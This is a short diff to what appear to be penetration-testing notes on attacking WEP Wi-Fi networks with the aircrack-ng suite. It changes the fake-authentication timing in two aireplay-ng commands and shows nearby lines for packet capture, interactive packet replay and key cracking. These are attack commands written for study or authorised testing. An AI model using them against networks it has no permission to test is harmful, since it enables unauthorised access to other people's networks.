@@ -205,7 +205,7 @@ aireplay-ng -9 -i wlan1 mon0 # wlan1 is receiving card
 --   useful when no clients available
 airmon-ng start wlan0 3 #set to channel 3
 airodump-ng -c 3 --bssid $AP_MAC -w [OUT FILE]
-aireplay-ng -1 0 -e $ESSID -a $AP_MAC -h $ATK_MAC mon0
+aireplay-ng -1 60 -e $ESSID -a $AP_MAC -h $ATK_MAC mon0
     # -1 = fake auth attack
     # 0 =  Re-association timing
 
@@ -237,7 +237,7 @@ aircrack-ng -0 [CAPTURE FILE]
 --Attacking a client to generate IV for WEP
 -- Only in range of client
 -- Restrictions on AP
-aireplay-ng -1 0 -e $ESSID -a $AP_MAC -h $ATK_MAC mon0 # Fake Authentication
+aireplay-ng -1 60 -e $ESSID -a $AP_MAC -h $ATK_MAC mon0 # Fake Authentication
 aireplay-ng -2 -b $AP_MAC -d FF:FF:FF:FF:FF:FF -f 1 -m68 -n 86 mon0
 # -2 Interactive packet replay attack
 # -d Destination Address  (FF:FF:FF:FF:FF:FF = Broadcast Address)
